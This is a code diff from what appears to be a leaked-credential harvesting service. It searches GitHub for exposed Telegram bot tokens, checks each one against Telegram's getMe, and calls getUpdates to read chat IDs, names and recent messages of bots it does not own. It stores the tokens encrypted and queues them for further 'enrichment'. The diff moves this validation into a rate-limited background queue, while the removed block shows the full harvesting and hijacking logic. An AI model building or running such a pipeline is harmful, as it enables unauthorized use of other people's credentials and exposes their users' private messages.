@@ -1,6 +1,7 @@
 import asyncio  # Ensure asyncio is imported
 import hashlib
 import logging
+import os
 import random
 import time
 
@@ -59,229 +60,38 @@ def _calculate_hash(token: str) -> str:
 
 async def _save_credentials_async(results, source_name: str):
     """
-    Validates token format and checks if bot is active via Telegram Bot API.
-    Saves if token passes format check AND getMe - does NOT require chats.
+    Enqueue each token for async validation on the dedicated `validation` queue.
 
-    VALIDATE_BATCH_CAP (env, default 50): max tokens validated per call.
-        Prevents hammering Telegram API when a scanner returns a large result set.
-    VALIDATE_INTER_SLEEP (env, default 0.3): seconds between getMe calls.
-        Low enough not to slow things down, high enough to avoid triggering
-        Telegram's per-IP validation rate limit (which pushes ALL bots into
-        bot_restricted cooldowns on the scraper side).
+    Returns the number of tokens ENQUEUED (not saved) — the actual save happens
+    later in worker-validators with global Redis-backed rate limiting.
+
+    This replaces the old in-line VALIDATE_BATCH_CAP=50 batch validation, which:
+      * silently dropped tokens beyond cap on big result sets
+      * blocked the scanner queue for 10-15 min per run
+      * burst getMe calls triggered Telegram per-IP secondary rate limits
+        that cascaded into bot_restricted cooldowns
+
+    Now: scanners return immediately after enqueue. Validators consume the
+    queue at a controlled rate (default 30 calls / 10s globally, env-tunable
+    via VALIDATE_RATE_MAX / VALIDATE_RATE_WINDOW).
     """
-    import httpx
-    import os as _os
+    from app.workers.tasks.validation_tasks import validate_token
 
-    from app.services.scanners import _is_valid_token
+    enqueued = 0
+    for item in results:
+        token = item.get("token")
+        if not token or token == "MANUAL_REVIEW_REQUIRED":
+            continue
+        # Fire-and-forget — validation worker handles dedup, getMe, save
+        validate_token.delay(item, source_name)
+        enqueued += 1
 
-    VALIDATE_CAP = int(_os.getenv("VALIDATE_BATCH_CAP", 50))
-    INTER_SLEEP = float(_os.getenv("VALIDATE_INTER_SLEEP", 0.3))
-
-    saved_count = 0
-    capped_results = results[:VALIDATE_CAP]
-    if len(results) > VALIDATE_CAP:
+    if enqueued:
         logger.info(
-            f"🔍 [Batch] Capping validation at {VALIDATE_CAP}/{len(results)} results from {source_name} "
-            f"(set VALIDATE_BATCH_CAP env to change)"
+            f"🔍 [Enqueue] {enqueued}/{len(results)} tokens from {source_name} "
+            f"queued for async validation"
         )
-    else:
-        logger.info(f"🔍 [Batch] Validating {len(capped_results)} potential credentials from {source_name}...")
-
-    # Use Async Client for validation
-    async with httpx.AsyncClient(timeout=10.0) as client:
-        for item in capped_results:
-            token = item.get("token")
-            if not token or token == "MANUAL_REVIEW_REQUIRED":
-                continue
-
-            # Step 1: Validate token format (reject Fernet/hashes)
-            if not _is_valid_token(token):
-                logger.debug(f"    ❌ [Validate] Invalid format: {token[:15]}...")
-                continue
-
-            token_hash = _calculate_hash(token)
-            existing_id = None
-            existing_has_chat = False
-
-            # Check if the result already has a chat_id (From URL/DeepScan extraction)
-            extracted_chat_id = item.get("chat_id")
-
-            try:
-                # Step 2: Check if already exists (Using async_execute)
-                existing = await async_execute(
-                    db.table("discovered_credentials")
-                    .select("id, chat_id")
-                    .eq("token_hash", token_hash)
-                )
-                if existing.data:
-                    existing_id = existing.data[0]["id"]
-                    existing_has_chat = existing.data[0].get("chat_id") is not None
-                    if existing_has_chat:
-                        logger.debug(
-                            f"    ⏭️ [Validate] Token {token[:10]}... already exists with chat_id."
-                        )
-                        continue  # Skip - already has chat_id
-                    logger.info(
-                        f"    🔄 [Validate] Token exists (ID: {existing_id}) but missing chat_id. Checking for updates..."
-                    )
-
-                # Step 3: Validate token with Telegram getMe API (NO CHAT REQUIRED)
-                # Adding localized retry for Telegram API flakes
-                base_url = f"https://api.telegram.org/bot{token}"
-                me_data = None
-                me_res = None
-
-                for attempt in range(2):
-                    try:
-                        me_res = await client.get(f"{base_url}/getMe")
-                        me_data = me_res.json()
-                        if me_res.status_code == 200 and me_data.get("ok"):
-                            break
-                    except Exception:
-                        if attempt == 0:
-                            await asyncio.sleep(1)
-                        continue
-
-                if not me_res or me_res.status_code != 200 or not me_data.get("ok"):
-                    logger.debug(
-                        f"    ❌ [Validate] Token invalid or revoked (HTTP {me_res.status_code if me_res else 'timeout'})"
-                    )
-                    continue
-
-                bot_info = me_data.get("result", {})
-                bot_username = bot_info.get("username", "unknown")
-                logger.info(
-                    f"    ✅ [Validate] Token VALID! Bot: @{bot_username} (ID: {bot_info.get('id')})"
-                )
-
-                # Step 4: Try to get a chat_id (Priority: Extracted -> API -> None)
-                chat_id = extracted_chat_id
-                chat_name = None
-                chat_type = None
-
-                if chat_id:
-                    logger.info(f"    📍 [Validate] Using extracted chat_id: {chat_id}")
-                else:
-                    # Skip getUpdates on the monitor bot — calling it here 409-conflicts with the bot_listener poller.
-                    from app.services.scraper_srv import scraper_service as _scraper_srv
-                    if _scraper_srv.is_monitor_bot(token):
-                        logger.debug(f"    ⏭️ [Validate] Skipping getUpdates for monitor bot token.")
-                    else:
-                        # Try to fetch via API if we didn't extract one
-                        try:
-                            updates_res = await client.get(
-                                f"{base_url}/getUpdates", params={"limit": 10}
-                            )
-                            if updates_res.status_code == 200 and updates_res.json().get("ok"):
-                                updates = updates_res.json().get("result", [])
-                                for update in updates:
-                                    for key in ["message", "channel_post", "my_chat_member"]:
-                                        if key in update and update[key].get("chat"):
-                                            chat = update[key]["chat"]
-                                            chat_id = chat.get("id")
-                                            chat_name = (
-                                                chat.get("title")
-                                                or chat.get("username")
-                                                or chat.get("first_name")
-                                            )
-                                            chat_type = chat.get("type")
-                                            break
-                                    if chat_id:
-                                        logger.info(
-                                            f"    🕵️ [Validate] Discovered chat_id via getUpdates: {chat_name} ({chat_id})"
-                                        )
-                                        break
-                        except Exception as e:
-                            logger.warning(f"    ⚠️ [Validate] getUpdates check failed: {e}")
-
-                # Step 5: Save to DB (INSERT new or UPDATE existing if we have chat_id)
-
-                if existing_id and chat_id:
-                    # UPDATE existing record with new chat_id.
-                    # Merge meta: existing stored meta takes priority so we never clobber
-                    # already-resolved fields (topic_id, bot_username, etc.).
-                    # Scanner result only fills keys that are missing from the stored meta.
-                    merged_meta = {
-                        **item.get("meta", {}),                    # scanner result (lowest prio)
-                        **existing.data[0].get("meta", {}),        # stored meta (wins on conflict)
-                        "last_seen_source": source_name,           # always update provenance
-                        "last_verified_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
-                    }
-                    update_data = {
-                        "chat_id": chat_id,
-                        "status": "active",
-                        "meta": merged_meta,
-                    }
-                    if chat_name:
-                        update_data["chat_name"] = chat_name
-                    if chat_type:
-                        update_data["chat_type"] = chat_type
-
-                    await async_execute(
-                        db.table("discovered_credentials").update(update_data).eq("id", existing_id)
-                    )
-                    logger.info(
-                        f"    🆙 [Batch] Updated existing record {existing_id} with chat_id {chat_id}"
-                    )
-                    saved_count += 1
-
-                elif existing_id and not chat_id:
-                    # BUG-010: Gate re-queue with Redis cooldown to prevent unbounded task flooding
-                    from app.core.redis_srv import redis_srv
-                    cooldown_key = f"enrich_requeue:{existing_id}"
-                    if not redis_srv.is_on_cooldown(cooldown_key):
-                        enrich_credential.delay(existing_id)
-                        redis_srv.set_cooldown(cooldown_key, 3600)  # 1-hour cooldown per credential
-
-                elif not existing_id:
-                    # INSERT new record
-                    new_data = {
-                        "bot_token": security.encrypt(token),
-                        "token_hash": token_hash,
-                        "chat_id": chat_id,
-                        "chat_name": chat_name,
-                        "chat_type": chat_type,
-                        "bot_id": str(bot_info.get("id")),
-                        "bot_username": bot_username,
-                        "source": source_name,
-                        "status": "pending" if not chat_id else "active",
-                        "meta": {
-                            **item.get("meta", {}),
-                            "bot_username": bot_username,
-                            "bot_id": bot_info.get("id"),
-                            "chat_name": chat_name,
-                            "chat_type": chat_type,
-                        },
-                    }
-
-                    res = await async_execute(db.table("discovered_credentials").insert(new_data))
-
-                    if res.data:
-                        new_id = res.data[0]["id"]
-                        status_label = "✅ ACTIVE" if chat_id else "⏳ PENDING"
-
-                        from app.workers.tasks.flow_tasks import get_broadcaster
-                        await get_broadcaster().send_log(
-                            f"🎯 [{source_name}] **New Bot Token!**\n"
-                            f"Bot: @{bot_username}\n"
-                            f"ID: `{new_id}`\n"
-                            f"Status: {status_label}"
-                        )
-                        saved_count += 1
-
-                        # TRIGGER ENRICHMENT for new credentials
-                        enrich_credential.delay(new_id)
-
-            except Exception as e:
-                logger.error(f"    ❌ [Validate] Error processing token: {str(e)}")
-                pass
-
-            # Pace getMe calls to avoid Telegram per-IP rate limit.
-            # Even 0.3s × 50 = 15s extra per batch — acceptable vs bot_restricted cooldown storm.
-            await asyncio.sleep(INTER_SLEEP)
-
-    logger.info(f"✅ [Batch] Finished. Saved/Updated {saved_count} credentials.")
-    return saved_count
+    return enqueued
 
 
 def _run_sync(coro):
@@ -462,9 +272,8 @@ async def _scan_github_async(query: str = None):
         '"api.telegram.org/bot" extension:php',
     ]
 
-    import os as _os
-    DORK_CAP = int(_os.getenv("GITHUB_DORK_CAP", 10))
-    QUERY_SLEEP = float(_os.getenv("GITHUB_QUERY_SLEEP", 8))
+    DORK_CAP = int(os.getenv("GITHUB_DORK_CAP", 10))
+    QUERY_SLEEP = float(os.getenv("GITHUB_QUERY_SLEEP", 8))
 
     if query:
         queries = [query]
